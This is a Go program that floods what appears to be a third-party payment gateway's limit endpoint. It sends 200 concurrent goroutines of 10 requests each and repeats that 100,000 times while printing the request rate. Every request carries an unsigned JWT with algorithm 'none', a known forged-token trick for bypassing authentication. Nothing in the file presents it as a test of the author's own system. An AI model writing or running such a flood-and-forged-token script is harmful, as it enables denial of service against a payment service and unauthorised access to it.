package main

import (
	"fmt"
	"sync"
	"time"

	"github.com/valyala/fasthttp"
)

const (
	numGoroutines = 200
	numRequests   = 10
	url           = "https://gateway.direct-pay.ru/api/v1/limit"
	authHeader    = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJleHAiOjE3MTc1MTI4NzYzMTN9."
)

func sendRequests(wg *sync.WaitGroup, rpsChan chan int) {
	defer wg.Done()
	client := &fasthttp.Client{
		MaxConnsPerHost: 10000, // Увеличьте количество соединений на хост
	}

	requestCount := 0

	for i := 0; i < numRequests; i++ {
		req := fasthttp.AcquireRequest()
		req.SetRequestURI(url)
		req.Header.SetMethod("GET")
		req.Header.Set("Authorization", authHeader)

		resp := fasthttp.AcquireResponse()

		err := client.Do(req, resp)
		if err != nil {
			fmt.Println("Error making request:", err)
			continue
		}
		fasthttp.ReleaseResponse(resp)
		fasthttp.ReleaseRequest(req)
		requestCount++
	}

	rpsChan <- requestCount
}

func main() {
	for i := 0; i < 100000; i++ {
		var wg sync.WaitGroup
		rpsChan := make(chan int, numGoroutines)

		startTime := time.Now()

		for i := 0; i < numGoroutines; i++ {
			wg.Add(1)
			go sendRequests(&wg, rpsChan)
		}

		wg.Wait()
		close(rpsChan)

		totalRequests := 0
		for rps := range rpsChan {
			totalRequests += rps
		}

		duration := time.Since(startTime).Seconds()
		rps := float64(totalRequests) / duration

		fmt.Printf("Total requests: %d\n", totalRequests)
		fmt.Printf("Duration: %.2f seconds\n", duration)
		fmt.Printf("RPS: %.2f\n", rps)
		fmt.Println("--------------------------")
	}
}
